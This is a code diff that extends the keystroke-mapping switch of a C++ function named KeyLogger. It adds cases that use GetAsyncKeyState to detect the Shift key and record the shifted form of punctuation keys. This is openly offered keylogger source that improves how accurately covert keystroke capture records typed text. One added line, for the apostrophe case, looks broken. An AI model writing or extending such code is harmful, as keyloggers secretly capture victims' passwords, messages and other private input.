@@ -46,11 +46,59 @@ void KeyLogger(void)
 
                 switch (character)
                 {
+                    case 39:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << """";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
+                    case 44:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "<";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
                     case 45:
                     {
                         if (GetAsyncKeyState(0x10))
                         {
                             write << "_";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
+                    case 46:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << ">";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
+                    case 47:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "?";
                         }
                         else
                         {
@@ -178,11 +226,71 @@ void KeyLogger(void)
                         }
                         break;
                     }
+                    case 59:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << ":";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
                     case 61:
                     {
                         if (GetAsyncKeyState(0x10))
                         {
                             write << "+";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
+                    case 91:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "{";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
+                    case 92:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "|";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
+                    case 93:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "}";
+                        }
+                        else
+                        {
+                            write << character;
+                        }
+                        break;
+                    }
+                    case 96:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "~";
                         }
                         else
                         {
